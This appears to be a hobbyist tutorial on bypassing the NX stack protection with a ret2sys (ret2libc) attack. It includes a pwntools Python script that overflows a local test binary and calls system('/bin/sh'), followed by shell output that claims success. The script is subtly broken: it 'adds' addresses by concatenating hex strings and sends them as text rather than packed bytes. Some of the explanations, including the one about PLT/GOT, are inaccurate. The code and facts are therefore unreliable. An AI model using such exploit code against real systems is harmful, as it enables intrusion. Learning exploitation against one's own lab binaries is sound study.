#Before I get into you can use this exploit, on your own linux binaries just so long as you have the same kernel and libc version as I do. 

What is NX?:
So NX/DEP (NX is for linux and DEP is for windows) is a binary security exploit migitation, which makes our stack non-executable. 
A good way to think of it regions of memory in data structures is like file permissions, so you can read to it, write to it and execute it, 
but that's the whole design for NX is to make it non-executable in your binary! Also RELRO which is read-only memory which is another binary security exploit mitigation, 
which we'll save for another day, this also alters with the whole permissions of regions of memory in our programs. 

What ret2sys is & and what it's for:

Then comes in the stack protections, the one we will be discussing today is NX.
The history behing this particular exploit mitigation is not spectacular, but its emergence made exploitation much more difficult for its time.
Normally, all of you code will be located within your .text section of the binary, there is no need to mark the stack as executable.
People began to realize that there is no need to execute any code on the stack or the heap, which caused the stack protection known as NX to be created/realized.

You can get around said stack protection techniques like ret2libc/ret2sys/ret2plt, return oriented programming, and the list goes on and on. 
But in this case im going to go over ret2sys which is very similiar if not identical to ret2libc.
The difference between the ret2 exploits and return oriented programming is that in ROP, you are exclusively using code that is built in within the binary, 
while with ret2libc/sys you will be reaching out to PLT memory table to recieve and call the addresses to functions within libc. 
For example the system() and exit() functions that are held in libc which are also therefore held in PLT (procedure_linkage_table)-GOT(Global_offset_table) memory tables which holds addresses for dynamically linked and statically linked libraries in memory! So exit() is used to exit and close off current the PID for the binary or program you are running, and system can give access to shell commands and shells themselves using child processes and such.

If you would like a more in depth explanation on how the GOT and PLT work together to resolve addresses for dynamically linked executables, 
feel free to check out this post from my big dick hacker friend!:
https://github.com/0xmanjoos/Exploit-Development/tree/main/fmt_bug/GOT-PLT

Let's go ahead and break down what libc is and system and exit functions:

So before we can get into how to exploit ret2libc/system let's explain what is is. 
In Linux systems, there resides the Standard Shared Library, this library will be loaded into memory on runtime and reside there until a function is called.
ret2libc/system is, again, thanks to the concept of dynamic linking, which means we are allowed to execute code, that exists outside of the binary.
Except in this case, there are more exploit mitigations that stand in our way of pwn!


Now I will show my ret2sys exploit and break it down.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------->
from pwn import *

#padding
rip_offset = 273
padding = "A" * rip_offset

#offests for system and exit
#(0x0000000000044be0)
#(0x00000000000503c0)

#addrs
libc_base_addr = ("0x00007ffff7dc9000")
libc_system = ("0x00007ffff7dc9000" + "0x00000000000503c0")
libc_exit = ("0x00007ffff7dc9000" + "0x0000000000044be0")
binsh_addr = ("0x7ffff7f7741f")
pop_rdi_ret = ("0x00000000004011d3")

#So we need our libc_base so we can add the offset of system and exit with the base to get an address for system and exit.
#So this is the reason im adding together the strings for an output that we send as an arg to our binary!


#payload
payload = padding + pop_rdi_ret + binsh_addr + libc_system + libc_exit

#print(hex(libc_system))
#print(hex(libc_exit))
#You can do this to see if you get a proper system and exit addr

#Setting up our pwntools for our processes
proc = process("./vuln_bin")  #My binary name
proc.sendline(payload)        #Sending my payload
proc.interactive()            #Making my shell interactive

#Some tools I used were the pwntools python module, the ropgadget tool to get my pop_rdi ; ret instruction, and I used ldd and readelf to get my libc_base and the
#offsets for libc_system and libc_exit, I also used a gdb (GNU linux command line debugger) plugin known as "gef" which is what I used to find the offset for the
#RIP address and was able to cause segmentation faults to get a offset.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Link to GEF GDB plugin!: https://github.com/hugsy/gef
Link to ROPgadget!:      https://github.com/JonathanSalwan/ROPgadget
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

So upon executing this in your shell with the usage like so: python3 (exploit_name).py your interface in your shell should look like this upon running:

laytathagod@pop-os ~D/B/rop> python3 exploit.py
[!] Could not find executable 'vuln_bin' in $PATH using './vuln_bin' instead
[+] starting local process './vuln_bin': pid 5458
[*] Switching to interactive mode
$
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
We have successfully summoned a shell and bypassed NX without ALSR using a ret2sys attack! 


Discord: Layta.#6424
Twitter: StackCanaries
Telegram: StackCanaries
